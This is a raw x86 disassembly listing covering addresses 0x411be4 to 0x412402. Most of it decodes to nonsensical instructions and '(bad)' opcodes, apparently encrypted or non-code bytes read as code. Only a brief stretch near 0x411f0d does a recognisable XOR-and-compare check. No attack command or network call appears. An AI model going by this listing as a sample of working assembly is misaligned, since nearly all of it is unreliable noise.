  411be4:	xor    DWORD PTR [edx+ebp*1],ecx
  411be7:	addr16 gs (bad) 
  411bea:	jno    0x411b8b
  411bec:	fcom   DWORD PTR ss:[ebp+0x7b5e462a]
  411bf3:	(bad)  
  411bf4:	and    esp,DWORD PTR [edi+0x9d9bf5]
  411bfa:	mov    fs,esi
  411bfc:	out    0x76,eax
  411bfe:	call   0x143049cc
  411c03:	in     eax,0xf2
  411c05:	jp     0x411c6f
  411c07:	lahf   
  411c08:	or     eax,0x2c1f540f
  411c0d:	cmp    BYTE PTR [ecx+ebx*1+0x31],al
  411c11:	mov    cs,esp
  411c13:	inc    esp
  411c14:	adc    eax,0x5834e950
  411c19:	mov    ebp,0x7fdde8fe
  411c1e:	push   edx
  411c1f:	pop    ebp
  411c20:	xor    edx,DWORD PTR [esi]
  411c22:	(bad)  
  411c23:	jnp    0x411bcb
  411c25:	pop    ebx
  411c26:	sbb    al,0x9f
  411c28:	pop    ebp
  411c29:	mov    ebx,0x340bd2fc
  411c2e:	cmp    eax,0x371ae44b
  411c33:	fbld   TBYTE PTR [eax+0x7e]
  411c36:	or     ebp,DWORD PTR [edx-0xbb7d530]
  411c3c:	or     DWORD PTR [ebx-0x7318674a],ecx
  411c42:	mov    DWORD PTR [eax-0xb247f2f],eax
  411c48:	xchg   edi,eax
  411c49:	(bad)  
  411c4a:	dec    eax
  411c4b:	lds    ecx,FWORD PTR ds:0xf8003cb7
  411c51:	aam    0x8c
  411c53:	retf   
  411c54:	leave  
  411c55:	(bad)  
  411c56:	cld    
  411c57:	dec    ebx
  411c58:	in     al,0x3e
  411c5a:	loope  0x411c6f
  411c5c:	jae    0x411c81
  411c5e:	cmp    eax,0x4ea1f131
  411c63:	arpl   WORD PTR [edx-0x6d],ax
  411c66:	fucomp st(0)
  411c68:	mov    ds:0xf7bfd02d,eax
  411c6d:	bts    DWORD PTR [esi],esi
  411c70:	dec    eax
  411c71:	(bad)  
  411c72:	or     DWORD PTR [eax+esi*8],0xffffffcf
  411c76:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c77:	mov    edi,0xf87e5167
  411c7c:	test   al,0x24
  411c7e:	adc    BYTE PTR [edx],dh
  411c80:	pop    ds
  411c81:	xchg   edi,eax
  411c82:	ins    DWORD PTR es:[edi],dx
  411c83:	adc    DWORD PTR [ecx],eax
  411c85:	cmp    DWORD PTR [eax+esi*2-0x5de9edd8],0xbafb96e0
  411c90:	jo     0x411c7b
  411c92:	mov    edi,ebp
  411c94:	pop    ebp
  411c95:	mov    esi,0x9a8ef210
  411c9a:	bound  esp,QWORD PTR [ebp-0x747b148a]
  411ca0:	adc    DWORD PTR [eax+0x6c],esp
  411ca3:	xchg   edi,eax
  411ca4:	mov    eax,ds:0xbfb8db4d
  411ca9:	adc    BYTE PTR [ebp+ecx*2-0x40e49429],ah
  411cb0:	addr16 add al,0xb1
  411cb3:	aas    
  411cb4:	pop    esp
  411cb5:	dec    ecx
  411cb6:	pop    ebp
  411cb7:	mov    ebx,0x4d146288
  411cbc:	ret    
  411cbd:	xchg   esp,eax
  411cbe:	sbb    DWORD PTR [eax],ecx
  411cc0:	jns    0x411c6c
  411cc2:	sbb    al,0x9
  411cc4:	jne    0x411c54
  411cc6:	sub    eax,DWORD PTR [edi-0x452c14b1]
  411ccc:	dec    eax
  411ccd:	xor    eax,DWORD PTR [eax+ebx*2+0x4d]
  411cd1:	push   es
  411cd2:	mov    bl,0xce
  411cd4:	in     eax,0xa0
  411cd6:	xchg   edx,eax
  411cd7:	jl     0x411c76
  411cd9:	cmp    eax,0x4f544017
  411cde:	je     0x411d00
  411ce0:	xchg   ecx,eax
  411ce1:	cmp    edx,ebp
  411ce3:	test   edi,edx
  411ce5:	or     eax,DWORD PTR [eax-0x60165c86]
  411ceb:	fstp   DWORD PTR [eax]
  411ced:	ror    BYTE PTR [edi],1
  411cef:	sub    al,0xf
  411cf1:	iret   
  411cf2:	or     eax,DWORD PTR [ecx-0x66ed433c]
  411cf8:	rcl    BYTE PTR [edi-0x8d4c26a],cl
  411cfe:	mov    es,ebx
  411d00:	pusha  
  411d01:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d02:	fs cmc 
  411d04:	data16 mov dh,0xe6
  411d07:	pop    esp
  411d08:	pop    ebx
  411d09:	gs arpl bx,di
  411d0c:	adc    edx,eax
  411d0e:	js     0x411c9a
  411d10:	(bad)  
  411d11:	jo     0x411cb3
  411d13:	dec    ecx
  411d15:	mov    dh,0x4f
  411d17:	mov    al,ds:0xde6d2e59
  411d1c:	sbb    DWORD PTR [edx],ebp
  411d1e:	mov    ah,cl
  411d20:	sbb    eax,0x36bac1eb
  411d25:	or     ch,BYTE PTR [eax-0x4f]
  411d28:	mov    eax,ds:0xafb37e65
  411d2d:	inc    esp
  411d2e:	xor    ebp,DWORD PTR [ebp-0x45779dc9]
  411d34:	imul   ebx,DWORD PTR [edx-0x64442590],0x59bc6912
  411d3e:	cli    
  411d3f:	push   edx
  411d40:	(bad)  
  411d41:	jecxz  0x411d70
  411d43:	fwait
  411d44:	pop    ss
  411d45:	retf   
  411d46:	stc    
  411d47:	mov    ds:0xfcac2435,al
  411d4c:	fisub  DWORD PTR [eax]
  411d4e:	inc    ebp
  411d4f:	std    
  411d50:	xchg   di,ax
  411d52:	sbb    al,0x69
  411d54:	mov    ecx,0x19ec2b1d
  411d59:	je     0x411ce0
  411d5b:	bound  esi,QWORD PTR [edi+0x738c9231]
  411d61:	sub    eax,0xe3ac3deb
  411d66:	cmp    eax,0x7ef31dfd
  411d6b:	call   DWORD PTR [edx-0x6]
  411d6e:	outs   dx,DWORD PTR ds:[esi]
  411d6f:	ret    0x9f81
  411d72:	inc    esp
  411d73:	jl     0x411dcc
  411d75:	dec    ebp
  411d76:	in     eax,0xf
  411d78:	(bad)  
  411d79:	adc    BYTE PTR [edi+ecx*1+0x7e49bba8],cl
  411d80:	ins    BYTE PTR es:[edi],dx
  411d81:	nop
  411d82:	aas    
  411d83:	jge    0x411d86
  411d85:	es es das 
  411d88:	sbb    eax,0xbc6e4082
  411d8d:	pop    ds
  411d8e:	adc    DWORD PTR [ebp-0xe10b36],eax
  411d94:	xchg   esi,eax
  411d95:	shl    dl,0x6
  411d98:	mov    cl,BYTE PTR [eax-0x1c]
  411d9b:	jmp    0x411d35
  411d9d:	xchg   ecx,eax
  411d9e:	mov    cl,0x2a
  411da0:	nop
  411da1:	call   FWORD PTR [ebp+0x76]
  411da4:	push   ebp
  411da5:	stc    
  411da6:	add    eax,0x3497d337
  411dab:	(bad)  [esi]
  411dad:	xchg   ecx,eax
  411dae:	jns    0x411d7f
  411db0:	mov    edx,0xb6d69cb6
  411db5:	mov    al,0xca
  411db7:	mov    bl,0x8d
  411db9:	jl     0x411dff
  411dbb:	or     al,BYTE PTR [ebx]
  411dbd:	or     esi,DWORD PTR [edi+0x56c2aabd]
  411dc3:	out    dx,al
  411dc4:	mov    BYTE PTR [edx+ecx*2+0x3d],dl
  411dc8:	stos   DWORD PTR es:[edi],eax
  411dc9:	inc    ebp
  411dca:	jge    0x411d9f
  411dcc:	and    DWORD PTR [eax-0x7b7a4d9c],esp
  411dd2:	fs dec eax
  411dd4:	bound  ebx,QWORD PTR [edx-0xcd42ca8]
  411dda:	pop    ds
  411ddb:	mov    esp,esi
  411ddd:	arpl   WORD PTR [eax+esi*4-0x1f],bp
  411de1:	loope  0x411e13
  411de3:	jns    0x411e07
  411de5:	shl    DWORD PTR [edx+0x8cc2c7c],cl
  411deb:	inc    ebx
  411dec:	jo     0x411e50
  411dee:	jle    0x411e5a
  411df0:	mov    DWORD PTR [ebp+0x664950bc],ebx
  411df6:	into   
  411df7:	inc    esi
  411df8:	leave  
  411df9:	inc    eax
  411dfa:	xchg   ebp,eax
  411dfb:	in     eax,dx
  411dfc:	(bad)  
  411dfd:	repnz fwait
  411dff:	pop    ds
  411e00:	xor    al,0xed
  411e02:	xchg   edx,eax
  411e03:	int    0x44
  411e05:	mov    ecx,0xe85b59ea
  411e0a:	dec    ebp
  411e0b:	popa   
  411e0c:	sbb    al,0xc9
  411e0e:	retf   
  411e0f:	adc    eax,0x13412db5
  411e14:	popa   
  411e15:	retf   0xaa9e
  411e18:	pop    ebp
  411e19:	iret   
  411e1a:	loopne 0x411dcc
  411e1c:	pop    ebp
  411e1d:	(bad)  
  411e1e:	xor    DWORD PTR [ebx+0x44],edi
  411e21:	mov    WORD PTR [ebx],fs
  411e23:	in     eax,dx
  411e24:	pop    esp
  411e25:	xchg   ebx,eax
  411e26:	mov    ecx,0x46621cdd
  411e2b:	int3   
  411e2c:	fcmovnbe st,st(5)
  411e2e:	jp     0x411e7b
  411e30:	pop    es
  411e31:	(bad)  
  411e33:	jnp    0x411eb4
  411e35:	fs push ebx
  411e37:	or     BYTE PTR [esp+esi*8],dl
  411e3a:	loop   0x411e2b
  411e3c:	outs   dx,BYTE PTR ds:[esi]
  411e3d:	in     eax,0x98
  411e3f:	inc    edi
  411e40:	fs mov al,ch
  411e43:	out    dx,eax
  411e44:	or     esi,DWORD PTR [ebp+0x7a1166cd]
  411e4a:	ss ret 0xca20
  411e4e:	sbb    al,0xc
  411e50:	in     eax,dx
  411e51:	shl    DWORD PTR [edx-0x71581138],0x17
  411e58:	xchg   esp,eax
  411e59:	aaa    
  411e5a:	jne    0x411e5d
  411e5c:	pop    eax
  411e5d:	mov    ebx,0xcc13147f
  411e62:	xor    ebp,DWORD PTR [edx+0x331ec208]
  411e68:	push   es
  411e69:	mov    eax,ds:0xd3a1424b
  411e6e:	push   edi
  411e6f:	ror    DWORD PTR [ebp-0x3d],0x4a
  411e73:	inc    eax
  411e74:	push   ss
  411e75:	jge    0x411e76
  411e77:	fldenv [edx-0x215ca3b4]
  411e7d:	in     al,0xb6
  411e7f:	es ja  0x411e4c
  411e82:	jns    0x411ec4
  411e84:	icebp  
  411e85:	and    BYTE PTR [edx+0x33],cl
  411e88:	mov    ebx,0xf6377341
  411e8d:	mov    WORD PTR [ecx-0x27],gs
  411e90:	addr16 lahf 
  411e92:	jp     0x411eca
  411e94:	mov    bl,0x90
  411e96:	les    ebp,FWORD PTR [ecx-0x6b]
  411e99:	mov    cl,0xb7
  411e9b:	test   BYTE PTR [esi],cl
  411e9d:	out    dx,eax
  411e9e:	mov    ecx,esi
  411ea0:	pop    ss
  411ea1:	mov    edx,0x1e76c69c
  411ea6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ea7:	dec    eax
  411ea8:	sub    eax,0xf3127eb0
  411ead:	clc    
  411eae:	aam    0x21
  411eb0:	xor    al,bl
  411eb2:	sbb    eax,0xc5f7adec
  411eb7:	jns    0x411e55
  411eb9:	fcmovu st,st(2)
  411ebb:	jle    0x411e3f
  411ebd:	dec    ebx
  411ebe:	dec    edx
  411ebf:	cli    
  411ec0:	fld    TBYTE PTR [edi+0x2c71b50f]
  411ec6:	or     DWORD PTR [esi+eax*2],eax
  411ec9:	dec    edi
  411eca:	(bad)  
  411ecb:	jbe    0x411e92
  411ecd:	push   es
  411ece:	add    BYTE PTR [ecx+0x3fccc0e9],al
  411ed4:	push   edi
  411ed5:	and    eax,0x806ab6cb
  411eda:	jl     0x411eb9
  411edc:	in     al,dx
  411edd:	adc    al,ch
  411edf:	jmp    FWORD PTR [ecx+0xd]
  411ee2:	gs pop ecx
  411ee4:	ficomp DWORD PTR [esi]
  411ee6:	std    
  411ee7:	fisttp WORD PTR [edx]
  411ee9:	sub    al,BYTE PTR [ebp-0x7c7101d5]
  411eef:	pop    esp
  411ef0:	and    BYTE PTR [edi],ah
  411ef2:	and    DWORD PTR [ebx+edi*2+0x7d6900a3],0x54
  411efa:	mov    ecx,0x3b9cebf9
  411eff:	mov    ebx,0x165ff2d9
  411f04:	mov    ebx,0x80ddcafc
  411f09:	bound  eax,QWORD PTR ss:[edx]
  411f0c:	dec    edi
  411f0d:	shl    eax,0x2
  411f10:	mov    DWORD PTR [ebp+0x10],edx
  411f13:	mov    edx,DWORD PTR [ebp-0x54]
  411f16:	xor    eax,0xba699573
  411f1b:	mov    DWORD PTR [ebp+0x14],edx
  411f1e:	cmp    eax,DWORD PTR [ebp+0x10]
  411f21:	jne    0x416379
  411f27:	mov    eax,edx
  411f29:	cmp    DWORD PTR [ebp+0xc],eax
  411f2c:	jne    0x416379
  411f32:	mov    DWORD PTR [ebp+0x8],0xba699573
  411f39:	jmp    0x4124c3
  411f3e:	(bad)  
  411f3f:	repz mov al,ds:0x46199861
  411f45:	sbb    dh,cl
  411f47:	jmp    0x8094cdc2
  411f4c:	mov    WORD PTR [esi+0x25],gs
  411f4f:	xor    BYTE PTR [esi],dl
  411f51:	push   ss
  411f52:	cmp    eax,0x42161604
  411f57:	mov    al,0x4c
  411f59:	ss pop es
  411f5b:	dec    esi
  411f5c:	(bad)  
  411f5d:	add    eax,0xe38d830a
  411f62:	out    0x94,eax
  411f64:	test   eax,0xc7ba444f
  411f69:	add    dh,bl
  411f6b:	fnsave [edx+0x859f754]
  411f71:	les    esp,FWORD PTR [edx-0x5098e569]
  411f77:	xor    DWORD PTR [edi+edi*8],esp
  411f7a:	pop    edi
  411f7b:	cmp    ch,BYTE PTR [edi-0x20c87e9a]
  411f81:	das    
  411f82:	aas    
  411f83:	jp     0x411f3b
  411f85:	mov    ebp,0x1a86058f
  411f8a:	xchg   ebx,eax
  411f8b:	test   DWORD PTR [ecx+0x17],esp
  411f8e:	out    dx,eax
  411f8f:	cwde   
  411f90:	or     ebx,DWORD PTR [eax-0x7fa16e6c]
  411f96:	inc    ebx
  411f97:	jnp    0x412016
  411f99:	jo     0x411f85
  411f9b:	xor    eax,0x6bc3db99
  411fa0:	jbe    0x411f6d
  411fa2:	push   eax
  411fa3:	aad    0xf4
  411fa5:	jmp    0x412024
  411fa7:	xchg   ebx,eax
  411fa8:	sub    al,0xea
  411faa:	out    dx,eax
  411fab:	aas    
  411fac:	mov    cl,0x11
  411fae:	bsr    ebx,DWORD PTR [ebx-0x34]
  411fb2:	inc    ecx
  411fb3:	cmc    
  411fb4:	bound  esi,QWORD PTR [edi+edi*1+0x67]
  411fb8:	mov    ebp,0x7dd798a5
  411fbd:	jnp    0x41201b
  411fbf:	(bad)  
  411fc0:	adc    ebp,DWORD PTR [eax+0x7d]
  411fc3:	pop    ecx
  411fc4:	sahf   
  411fc5:	loope  0x412040
  411fc7:	sbb    eax,0xf185da1b
  411fcc:	sub    eax,0x5775424a
  411fd1:	inc    esi
  411fd2:	into   
  411fd3:	push   cs
  411fd4:	cdq    
  411fd5:	xchg   edx,eax
  411fd6:	push   0x44
  411fd8:	sub    al,0x2e
  411fda:	adc    eax,0x73e4f2d7
  411fdf:	adc    eax,0x35057d2b
  411fe4:	test   al,0xba
  411fe6:	dec    edi
  411fe7:	repnz cs pop edx
  411fea:	cwde   
  411feb:	fwait
  411fec:	stos   DWORD PTR es:[edi],eax
  411fed:	or     edi,DWORD PTR [ecx+0x56]
  411ff0:	fdivr  st(1),st
  411ff2:	lock sub DWORD PTR [edx],0x53
  411ff6:	push   cs
  411ff7:	ins    DWORD PTR es:[edi],dx
  411ff8:	ror    bh,0x13
  411ffb:	fs push esi
  411ffd:	jp     0x412012
  411fff:	mov    dh,BYTE PTR [esi-0x41274ef3]
  412005:	mov    cl,0x93
  412007:	xchg   ebx,eax
  412008:	fs jnp 0x411fc1
  41200b:	inc    ecx
  41200c:	add    DWORD PTR [eax+edi*2+0x16],0x1c
  412011:	dec    edx
  412012:	xor    al,0xaf
  412014:	cli    
  412015:	arpl   WORD PTR [edx+0x3cdad701],si
  41201b:	out    0xa7,eax
  41201d:	shl    DWORD PTR [ecx-0x4d5db26d],1
  412023:	inc    edi
  412024:	jae    0x411ffb
  412026:	xor    DWORD PTR ds:0x711d1c97,eax
  41202c:	daa    
  41202d:	jmp    0xa8b3:0xa314454f
  412034:	jle    0x411fd7
  412036:	add    eax,0x30b19d0e
  41203b:	adc    BYTE PTR [ebx+0x34],ch
  41203e:	(bad)  
  41203f:	ja     0x4120ab
  412041:	arpl   sp,di
  412043:	mov    DWORD PTR [ebx+0x7b195a14],edi
  412049:	jle    0x412033
  41204b:	xor    ah,BYTE PTR [esi-0x786b6d85]
  412051:	push   esi
  412052:	(bad)  
  412053:	cmc    
  412054:	push   esp
  412055:	mov    ds:0x10bf910a,eax
  41205a:	(bad)  [edx]
  41205c:	xor    DWORD PTR [edx],esp
  41205e:	pop    esp
  41205f:	inc    ecx
  412060:	in     al,0x9d
  412062:	cld    
  412063:	or     ebx,DWORD PTR [edi]
  412065:	addr16 pop ds
  412067:	or     DWORD PTR [ebx+0x2e],eax
  41206a:	push   edx
  41206b:	jb     0x4120a1
  41206d:	ins    BYTE PTR es:[edi],dx
  41206e:	jp     0x41203c
  412070:	ja     0x4120e6
  412072:	adc    DWORD PTR [ebx-0x37],edx
  412075:	es sub al,0x19
  412078:	xchg   esp,eax
  412079:	sti    
  41207a:	inc    ecx
  41207b:	leave  
  41207c:	xchg   edi,eax
  41207d:	in     eax,dx
  41207e:	and    eax,0xb113e446
  412083:	(bad)  [ebx-0x3408848d]
  412089:	jns    0x412085
  41208b:	rol    DWORD PTR [ebx],0x19
  41208e:	pop    edi
  41208f:	jbe    0x412023
  412091:	xor    eax,0x355bce6d
  412096:	jmp    0xc5b8:0x2b7632ec
  41209d:	ret    
  41209e:	and    bh,cl
  4120a0:	mov    ds:0x7d37bc0b,al
  4120a5:	dec    eax
  4120a6:	(bad)  
  4120a7:	addr16 rcr ch,cl
  4120aa:	inc    ebx
  4120ab:	lea    ebp,[esi*2+0x4cf54009]
  4120b2:	xor    al,0x15
  4120b4:	(bad)  [eax+0x32e7599b]
  4120ba:	add    DWORD PTR [ebp+0x7108ab85],edx
  4120c0:	xchg   BYTE PTR [ecx+0x6c18c99a],dh
  4120c6:	add    DWORD PTR [ebx+0x21],ebp
  4120c9:	jmp    0x4120a6
  4120cb:	add    DWORD PTR [esi],0x1a442139
  4120d1:	xchg   ebp,eax
  4120d2:	xchg   esi,eax
  4120d3:	dec    esp
  4120d4:	fld    QWORD PTR [eax-0x61653a5e]
  4120da:	or     edx,DWORD PTR [ebx]
  4120dc:	jmp    0x41211e
  4120de:	test   al,0xd4
  4120e0:	retf   0x3630
  4120e3:	fisttp WORD PTR [esi+0x497bc73d]
  4120e9:	sahf   
  4120ea:	xor    ebx,DWORD PTR [edx+0x58a363fc]
  4120f0:	mov    edi,0x53a49ddc
  4120f5:	push   eax
  4120f6:	mov    bh,0x4b
  4120f8:	push   esp
  4120f9:	lahf   
  4120fa:	pusha  
  4120fb:	inc    edi
  4120fc:	push   cs
  4120fd:	in     al,dx
  4120fe:	scas   eax,DWORD PTR es:[edi]
  4120ff:	jmp    0xaf0c182a
  412104:	adc    al,0x7
  412106:	fisubr WORD PTR [eax+0x51]
  412109:	mov    al,0xf5
  41210b:	bnd jmp 0x41218d
  41210e:	add    BYTE PTR [ebp-0x5],al
  412111:	enter  0x39df,0xae
  412115:	mov    ebp,0x9b31f97d
  41211a:	ficomp WORD PTR [esi+0x64385e69]
  412120:	icebp  
  412121:	stos   DWORD PTR es:[edi],eax
  412122:	adc    esi,DWORD PTR [edi+0x35317e26]
  412128:	ins    BYTE PTR es:[edi],dx
  412129:	ret    
  41212a:	xchg   edx,eax
  41212b:	push   0xb9ae7899
  412130:	jg     0x412144
  412132:	call   0xdfe8cc1
  412137:	shl    DWORD PTR [esi],cl
  412139:	add    ch,BYTE PTR [esi+0x51]
  41213c:	out    0xea,eax
  41213e:	das    
  41213f:	dec    edi
  412140:	mov    bl,0x6
  412142:	mov    ah,0x2
  412144:	ret    0x5e3c
  412147:	addr16 ret 
  412149:	sbb    DWORD PTR [edx],0xffffffe8
  41214c:	jmp    0x2f79:0x8a49ac43
  412153:	jmp    0x4121bb
  412155:	mov    DWORD PTR [edi+esi*1],eax
  412158:	mov    ebp,0xbff27d28
  41215d:	imul   eax,DWORD PTR [eax+eiz*1],0x9fe4d8ea
  412164:	cmc    
  412165:	test   eax,0x27ad7c0e
  41216a:	(bad)  
  41216b:	call   0xe425:0xf67fd508
  412172:	mov    bh,0x4
  412174:	cmp    eax,0x7f378df2
  412179:	pop    edi
  41217a:	push   esp
  41217b:	test   DWORD PTR [eax+0x58703ca6],ecx
  412181:	jns    0x412155
  412183:	xor    cl,BYTE PTR [ebp+0x56]
  412186:	scas   eax,DWORD PTR es:[edi]
  412187:	test   eax,0x167c1714
  41218c:	pop    edx
  41218d:	sbb    edi,esi
  41218f:	jnp    0x412155
  412191:	cmp    dl,BYTE PTR ds:[ebx+0x6edfb425]
  412198:	retf   0x202a
  41219b:	arpl   cx,ax
  41219d:	retf   
  41219e:	xor    esi,esp
  4121a0:	jno    0x4121f2
  4121a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4121a3:	cmp    ebp,DWORD PTR [eax-0x79]
  4121a6:	or     eax,0xee6b85cb
  4121ab:	shl    BYTE PTR [ecx+0x419758b9],1
  4121b1:	xor    al,0xe8
  4121b3:	mov    dh,0xd3
  4121b5:	lea    esp,[eax+0x70aa3381]
  4121bb:	jns    0x4121f6
  4121bd:	push   ecx
  4121be:	iret   
  4121bf:	fisttp QWORD PTR [esi+0x52]
  4121c2:	jne    0x4121b7
  4121c4:	nop
  4121c5:	(bad)  [esi-0x20]
  4121c8:	adc    al,0x17
  4121ca:	inc    ebx
  4121cb:	in     eax,0x25
  4121cd:	xchg   ecx,eax
  4121ce:	iret   
  4121cf:	mov    edx,0xd0b479b7
  4121d4:	idiv   DWORD PTR [esi+edi*4]
  4121d7:	fcmovnu st,st(7)
  4121d9:	sbb    dh,BYTE PTR [edx+0x2e7086f4]
  4121df:	cli    
  4121e0:	fwait
  4121e1:	add    DWORD PTR [ecx+0x987ab6f],esi
  4121e7:	hlt    
  4121e8:	mov    edx,0x8d79f46b
  4121ed:	adc    ch,bl
  4121ef:	and    al,0xde
  4121f1:	fsubr  DWORD PTR [eax]
  4121f3:	cli    
  4121f4:	and    eax,edi
  4121f6:	or     edx,DWORD PTR [eax+ebx*4+0x20]
  4121fa:	test   DWORD PTR [ecx+0x6c],edi
  4121fd:	mov    al,ds:0xaab5e77
  412202:	sbb    DWORD PTR [edx],eax
  412204:	pop    eax
  412205:	jae    0x41222a
  412207:	(bad)  
  412208:	stos   DWORD PTR es:[edi],eax
  412209:	xor    BYTE PTR [ecx-0x1d191e02],cl
  41220f:	repz cmp eax,0xb0595304
  412215:	and    eax,0xa31c2ea2
  41221a:	jge    0x412211
  41221c:	jae    0x41226e
  41221e:	push   edx
  41221f:	push   ds
  412220:	add    DWORD PTR ds:0xd6292f5c,edi
  412226:	imul   ebp,DWORD PTR [edx],0xfffffff7
  412229:	mov    eax,0x2953912d
  41222e:	cs xchg edx,eax
  412230:	jne    0x412213
  412232:	in     al,dx
  412233:	xor    bh,BYTE PTR [esp+eax*4]
  412236:	inc    edx
  412237:	mov    ch,0x3
  412239:	lods   eax,DWORD PTR ds:[esi]
  41223a:	(bad)  
  41223b:	cmp    eax,0x6618f662
  412240:	test   al,ch
  412242:	cmp    ch,dh
  412244:	mov    edi,ebp
  412246:	icebp  
  412247:	mov    ch,0x30
  412249:	xor    dl,BYTE PTR [edi]
  41224b:	scas   al,BYTE PTR es:[edi]
  41224c:	sbb    al,0x2d
  41224e:	add    al,0x3e
  412250:	sbb    BYTE PTR [ecx],ch
  412252:	scas   eax,DWORD PTR es:[edi]
  412253:	jnp    0x4122c0
  412255:	and    al,0x26
  412257:	mov    dh,0xef
  412259:	sahf   
  41225a:	fs int 0x8b
  41225d:	popa   
  41225e:	xchg   ecx,eax
  41225f:	push   edx
  412260:	sbb    eax,0x8fa12987
  412265:	mov    ebx,DWORD PTR [ecx]
  412267:	inc    esp
  412268:	adc    bh,BYTE PTR [ecx]
  41226a:	mov    esp,0xc9a6d304
  41226f:	arpl   WORD PTR [edi-0x72],di
  412272:	jp     0x412200
  412274:	in     eax,dx
  412275:	cmp    eax,DWORD PTR [edx-0x2d]
  412278:	xor    eax,0x549fe230
  41227d:	pop    edi
  41227e:	inc    ebx
  41227f:	ins    DWORD PTR es:[edi],dx
  412280:	push   edi
  412281:	xor    bh,al
  412283:	clc    
  412284:	sub    DWORD PTR fs:[eax],esi
  412287:	fisttp WORD PTR [ebx+0x2f980d64]
  41228d:	xor    DWORD PTR [ebp+0x6abc9f56],eax
  412293:	mov    ecx,0x8fceff4a
  412298:	dec    edx
  412299:	push   ebx
  41229a:	dec    edi
  41229b:	inc    esp
  41229c:	je     0x41224e
  41229e:	push   edx
  41229f:	mov    eax,ds:0x3c38d2cc
  4122a4:	mov    esp,0x7db2c4cf
  4122a9:	in     al,0x81
  4122ab:	mov    edx,0xed54a935
  4122b0:	aad    0xb8
  4122b2:	xlat   BYTE PTR ds:[ebx]
  4122b3:	pop    esp
  4122b4:	jo     0x41230a
  4122b6:	jmp    0x4d79:0x116b1fee
  4122bd:	adc    esi,DWORD PTR [edx+0x2a]
  4122c0:	push   0x3ee76f74
  4122c5:	or     dl,dh
  4122c7:	xor    edi,DWORD PTR [ebx]
  4122c9:	imul   DWORD PTR [eax+0x55]
  4122cc:	loop   0x412322
  4122ce:	mov    dh,dl
  4122d0:	mov    edx,0x79a8ba27
  4122d5:	scas   al,BYTE PTR es:[edi]
  4122d6:	mov    dl,0x5a
  4122d8:	xchg   edx,eax
  4122d9:	data16 (bad) 
  4122db:	mov    ah,0xae
  4122dd:	cmp    al,0x56
  4122df:	xor    ebp,DWORD PTR [eax]
  4122e1:	or     al,0xeb
  4122e3:	clc    
  4122e4:	mov    ds:0x2222636,al
  4122e9:	les    ebp,FWORD PTR [ebx-0x2f85454e]
  4122ef:	int    0x6d
  4122f1:	push   0xffffffa5
  4122f3:	xor    ebx,esi
  4122f5:	push   es
  4122f6:	inc    ecx
  4122f7:	sub    eax,0x2bbaf0d
  4122fc:	mov    cl,0xce
  4122fe:	ins    BYTE PTR es:[edi],dx
  4122ff:	push   edx
  412300:	add    eax,0x4120b25
  412305:	cli    
  412306:	jg     0x412290
  412308:	push   edi
  412309:	inc    edi
  41230a:	dec    edi
  41230b:	mov    ds:0xd4302d28,eax
  412310:	ins    BYTE PTR es:[edi],dx
  412311:	pop    ds
  412312:	cmp    eax,0x63858697
  412317:	mov    ?,WORD PTR [ebx+0x1a26453e]
  41231d:	push   edx
  41231e:	mov    ah,0x11
  412320:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412321:	and    al,0x44
  412323:	sbb    esi,ecx
  412325:	bound  ecx,QWORD PTR [ecx+edi*2]
  412328:	cdq    
  412329:	xor    al,0x42
  41232b:	xchg   edi,eax
  41232c:	dec    ebx
  41232d:	adc    cl,BYTE PTR [eax]
  41232f:	sub    eax,DWORD PTR [edx-0x28]
  412332:	in     al,0xba
  412334:	or     esp,DWORD PTR [ebx-0x14]
  412337:	sbb    edx,DWORD PTR [ecx]
  412339:	imul   ebx,DWORD PTR [ecx],0x4f73c269
  41233f:	fsub   DWORD PTR [ebp+0x4e]
  412342:	and    dl,bh
  412344:	scas   eax,DWORD PTR es:[edi]
  412345:	shl    DWORD PTR [ecx],0x24
  412348:	call   DWORD PTR [ecx-0x1c4bf71d]
  41234e:	cmp    bh,BYTE PTR [esi]
  412350:	enter  0x6fc,0x11
  412354:	or     edx,DWORD PTR [ecx]
  412356:	sar    bl,1
  412358:	mov    WORD PTR [ebp+0x5f],ds
  41235b:	and    al,0xb3
  41235d:	push   0x97b0892
  412362:	push   ebp
  412363:	clc    
  412364:	jmp    0xfbab1656
  412369:	out    dx,al
  41236a:	mov    dl,0x6a
  41236c:	shl    BYTE PTR [edi-0x13],cl
  41236f:	mov    edi,0x78003160
  412374:	test   al,0xeb
  412376:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412377:	xchg   DWORD PTR [edx+0x15],esp
  41237a:	fwait
  41237b:	jo     0x412388
  41237d:	push   ds
  41237e:	mov    ebp,0xbbd7d82a
  412383:	call   0xa31fd8c
  412388:	retf   0xd724
  41238b:	div    DWORD PTR [ebp-0x48]
  41238e:	and    eax,0xb04abdf6
  412393:	lods   eax,DWORD PTR ds:[esi]
  412394:	sub    BYTE PTR [ecx-0x41],al
  412397:	pusha  
  412398:	and    dh,dl
  41239a:	mov    eax,0x31ddd29b
  41239f:	cwde   
  4123a0:	pop    ebp
  4123a1:	fisubr WORD PTR [ebx+0x7aa6bbca]
  4123a7:	arpl   sp,si
  4123a9:	mov    edx,DWORD PTR [edi+0x26]
  4123ac:	xchg   ebp,eax
  4123ad:	test   al,0x7f
  4123af:	mov    eax,0xfd4628c2
  4123b4:	push   0x673d403
  4123b9:	ret    
  4123ba:	in     eax,dx
  4123bb:	and    esp,edx
  4123bd:	jae    0x412402
  4123bf:	sbb    eax,0x9c92ae94
  4123c4:	fldcw  WORD PTR [eax]
  4123c6:	pop    es
  4123c7:	pop    ss
  4123c8:	sbb    al,BYTE PTR [eax-0xf]
  4123cb:	mov    esp,0x8133d95f
  4123d0:	loop   0x41241f
  4123d2:	xchg   BYTE PTR [edi+0x24c662cc],cl
  4123d8:	or     eax,0x33aaad8e
  4123dd:	(bad)  
  4123de:	add    al,0x73
  4123e0:	fcom   st(3)
  4123e2:	out    0x70,al
  4123e4:	jge    0x4123ad
  4123e6:	xor    BYTE PTR [ebx+0x2],dl
  4123e9:	xchg   ecx,eax
  4123ea:	xor    al,0xfa
  4123ec:	mov    fs,WORD PTR [eax-0x2b277ca9]
  4123f2:	jmp    0x1d01:0x11a54b15
  4123f9:	out    0x3c,eax
  4123fb:	sbb    DWORD PTR [ecx-0x1b],0xe1da529f
  412402:	aad    0x2a
